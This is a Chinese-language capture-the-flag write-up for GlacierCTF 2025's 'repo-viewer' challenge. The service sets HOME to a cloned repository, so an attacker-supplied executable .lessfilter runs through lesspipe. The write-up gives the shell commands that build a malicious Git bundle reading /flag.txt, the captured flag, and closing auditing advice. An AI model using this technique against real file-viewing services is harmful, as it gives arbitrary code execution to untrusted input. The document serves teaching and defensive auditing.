# GlacierCTF 2025 repo-viewer

## 题目简述

服务接收 Base64 编码的 Git bundle，将其 clone 到临时目录，然后在 nsjail 中用 `less README.md` 展示仓库说明。脚本检查 `README.md` 不是符号链接，还复制受控 `.lesskey` 以限制 less 按键，乍看只能读取 README。

真正的执行入口不是 README 本身，而是脚本中的 `eval $(lesspipe)`。系统的 lesspipe 会在当前 HOME 查找并执行 `.lessfilter`，而 clone 后的攻击者仓库正是 HOME。由此可在沙箱内执行任意命令并读取 `/flag.txt`，所以应归入 Pwn。

## 解题过程

### 1. 找到 less 的预处理链

挑战脚本的关键顺序是：

```bash
git clone repo.bundle repo
cd repo
export HOME="$PWD"
eval "$(lesspipe)"
less README.md
```

`lesspipe` 并不是单纯的显示配置。它为 less 设置输入预处理器；当目标文件被打开时，预处理流程会尝试执行用户目录中的可执行 `.lessfilter`。题目将攻击者仓库设成 HOME，等于主动把过滤器搜索路径交给攻击者。

对 `README.md` 的 symlink 检查无法阻断这条路径，因为最终被执行的是另一个普通文件 `.lessfilter`。`.lesskey` 只约束交互按键，也不影响打开文件前已经发生的预处理。

### 2. 构造恶意 Git bundle

创建一个最小仓库，提交正常 README 和可执行过滤器：

```bash
git init exploit-repo
cd exploit-repo
printf 'hello\n' > README.md
printf '#!/bin/sh\ncat /flag.txt\n' > .lessfilter
chmod +x .lessfilter
git add README.md .lessfilter
git commit -m init
git bundle create repo.bundle --all
```

将 `repo.bundle` Base64 编码并按服务协议发送，最后用题目要求的 `@` 结束输入。服务 clone 后调用 less，lesspipe 执行 `.lessfilter`，其标准输出直接回到连接中。

源码实例输出：

```text
gctf{B3w4r3_0f_0bscur3_5hell_F34tur3s}
```

### 3. 验证触发点

可做两个差分实验确认漏洞来源：去掉 `.lessfilter` 时只显示 README；保留文件但去掉执行位时过滤器不会作为程序运行；恢复执行位后 flag 出现在 less 输出之前。这个差分排除了 Git hook、README 终端转义或 `.lesskey` 等错误方向。

## 方法总结

本题利用的是被忽略的 shell 工具扩展机制。沙箱只限制进程能做什么，并不会自动让启动命令安全；一旦把攻击者可写目录设为 HOME，lesspipe、编辑器配置、pager、语言启动文件等都可能变成执行入口。审计“只读文件查看器”时，必须沿完整进程链检查环境变量和辅助程序，而不能只验证最终文件路径。
